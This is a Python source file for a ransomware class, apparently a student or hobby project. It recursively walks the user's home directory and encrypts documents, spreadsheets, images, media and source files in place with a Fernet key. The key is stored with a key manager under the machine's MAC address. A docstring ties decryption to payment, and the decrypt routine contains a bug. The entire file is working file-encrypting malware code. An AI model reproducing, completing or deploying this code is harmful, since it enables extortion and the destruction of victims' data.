
from cryptography.fernet import Fernet 
import os
import getpass
import socket
import uuid
from uuid import getnode as get_mac
from KeyManager import KeyManager


class Ransom:

    def __init__(self, key = None, targets = None, root = None):
        # TOdO
        if key != None:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.targets = ['txt', 'doc', 'docx', 'pdf', 'tex', 'csv' ,'xls', 'xlsx', 
                        'xlsm', 'mp3', 'midi', 'mp4', 'zip', 'xml', 'html', 'css', 
                        'png', 'jpg', 'jpeg', 'svg', 'gif', 'ico', 'ppt', 'pptx', 
                        'java', 'c', 'cpp', 'js']
        if root == None:
            self.root = self.getDefaultRoot()
        else:
            self.root = root
        
        self.keyManager = KeyManager()
    
    def getDefaultRoot(self):
        """
            Returns the base folder where the encryption starts
        """
        path = os.path.expanduser("~")
        return path

    def encrypt(self):
        """
            Encrypts alla the documents inside the specified basefolder and all its subfolders
        """
        for root, dirs, files in os.walk(self.root):
            for file in files:
                filePath = os.path.join(root, file)
                if filePath.split('.')[-1] in self.targets:
                    try:
                        self.encryptFile(filePath)
                    except Exception as error:
                        print(error)
                    
            #for name in dirs:
               # print(os.path.join(root, name))
        self.keyManager.insertKey(get_mac(), self.key)

    def encryptFile(self, file):
        """
            Encrypts a file
        """
        with open(file, 'rb+') as f:
            content = f.read()
            encryptedContent = self.fernet.encrypt(content)
            f.seek(0) ## So we overwrite it
            f.write(encryptedContent)
            f.truncate()

    def startDecryption(self):
        """
            Start decryption of the computer
            If no payments hase been made this will raise an error
        """
        self.key = self.keyManager.getKey(get_mac())
        if self.key == '':
            raise ValueError('The key is empty. Cannot decrypt without a key')
            print('No key') ### TODO díla við þetta
            return 
        self.Fernet = Fernet(self.key)
        self.decrypt()
    
    def decrypt(self):
        """
            Decrypts all the documents inside the specified basefolder and all its subfolders
            Note: Since this uses symmetric decryption then encryption and decryption is equivalent
        """
        for root, dirs, files in os.walk(self.root):
            for file in files:
                filePath = os.path.join(root, file)
                if filePath.split('.')[-1] in self.targets:
                    try:
                        self.decryptFile(filePath)
                    except Exception as error:
                        print(error)
                    
            
        
    def decryptFile(self, file):
        """
            Encrypts a file
        """
        with open(file, 'rb+') as f:
            content = f.read()
            decryptedContent = self.fernet.decrypt(content)
            f.seek(0) ## So we overwrite it
            f.write(decryptedContent)
            f.truncate()
    

        
